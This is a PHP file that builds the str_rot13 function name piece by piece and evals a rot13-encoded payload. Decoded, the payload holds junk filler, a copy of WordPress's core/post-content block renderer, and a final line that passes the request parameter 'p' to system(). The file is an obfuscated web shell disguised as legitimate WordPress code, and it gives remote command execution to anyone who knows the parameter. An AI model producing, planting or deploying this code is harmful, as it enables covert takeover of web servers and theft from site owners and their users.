<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-pbagrag` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-pbagrag` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Ergheaf gur svygrerq cbfg pbagrag bs gur pheerag cbfg.
 */
shapgvba eraqre_oybpx_pber_cbfg_pbagrag( $nggevohgrf, $pbagrag, $oybpx ) {
	fgngvp $frra_vqf = neenl();

	vs ( ! vffrg( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea '';
	}

	$cbfg_vq = $oybpx->pbagrkg['cbfgVq'];

	vs ( vffrg( $frra_vqf[ $cbfg_vq ] ) ) {
		// JC_QROHT_QVFCYNL zhfg bayl or ubaberq jura JC_QROHT. Guvf cerprqrag
		// vf frg va `jc_qroht_zbqr()`.
		$vf_qroht = JC_QROHT && JC_QROHT_QVFCYNL;

		erghea $vf_qroht ?
			// genafyngbef: Ivfvoyr bayl va gur sebag raq, guvf jneavat gnxrf gur cynpr bs n snhygl oybpx.
			__( '[oybpx eraqrevat unygrq]' ) :
			'';
	}

	$frra_vqf[ $cbfg_vq ] = gehr;

	// Jura vafvqr gur znva ybbc, jr jnag gb hfr dhrevrq bowrpg
	// fb gung `gur_cerivrj` sbe gur pheerag cbfg pna nccyl.
	// Jr sbepr guvf orunivbe ol bzvggvat gur guveq nethzrag (cbfg VQ) sebz gur `trg_gur_pbagrag`.
	$pbagrag = trg_gur_pbagrag();
	// Purpx sbe arkgcntr gb qvfcynl cntr yvaxf sbe cntvangrq cbfgf.
	vs ( unf_oybpx( 'pber/arkgcntr' ) ) {
		$pbagrag .= jc_yvax_cntrf( neenl( 'rpub' => 0 ) );
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
	$pbagrag = nccyl_svygref( 'gur_pbagrag', fge_ercynpr( ']]>', ']]&tg;', $pbagrag ) );
	hafrg( $frra_vqf[ $cbfg_vq ] );

	vs ( rzcgl( $pbagrag ) ) {
		erghea '';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => 'ragel-pbagrag' ) );

	erghea (
		'<qvi ' . $jenccre_nggevohgrf . '>' .
			$pbagrag .
		'</qvi>'
	);
}

/**
 * Ertvfgref gur `pber/cbfg-pbagrag` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_pbagrag() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-pbagrag',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cbfg_pbagrag',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_pbagrag' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>